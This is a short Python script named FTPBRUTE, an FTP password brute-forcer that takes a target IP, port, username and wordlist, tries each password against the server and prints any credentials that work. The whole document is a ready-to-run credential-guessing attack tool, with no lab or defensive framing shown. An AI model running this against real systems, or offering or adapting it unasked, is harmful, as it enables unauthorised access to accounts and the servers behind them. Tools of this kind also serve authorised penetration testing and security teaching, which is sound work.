#!/bin/python3

import ftplib
from termcolor import colored
from termcolor import cprint
import pyfiglet
import argparse

result = pyfiglet.figlet_format("FTPBRUTE")

print(result)

## Argument Parser
parser = argparse.ArgumentParser(description="FTP Brute Forcer")
parser.add_argument("-t", "--target", type=str, required=True, help="The Targets IP")
parser.add_argument("-u", "--username", type=str, required=True, help="The Targets UserName")
parser.add_argument("-p", "--port", type=int, required=True, help="The Targets Port")
parser.add_argument("-w", "--wordlist", type=str , required=True, help="Wordlist to User")

args = parser.parse_args()

host = args.target
port = args.port
user = args.username
passlist = args.wordlist


print("#" * 65)


# Just some color fucnctions
def coloredcorrect(text):
	cprint("[*]", 'green', end= " ")
	print(text, end=" ")


def coloredincorrect(text):
	print("[", end='')
	cprint("!", 'red', attrs=['bold'], end="")
	print("]", text, end="")



## Login And check if password works
def iscorrect(passwords):

	try:
		server = ftplib.FTP()
		coloredincorrect("Trying: ")
		cprint(f"{user}:{passwords}", 'red')

		server.connect(host, port, timeout=5)

		server.login(user,passwords)

	except ftplib.error_perm:
			return False

	else:

		cprint("#" * 50, 'green')
		coloredcorrect("Found Creds:")
		cprint(f"{user}:{passwords}", 'green')
		cprint("#" * 50, 'green')
		return True

password = open(passlist, 'r').read().split('\n')

for passes in password:
	if iscorrect(passes):
		break
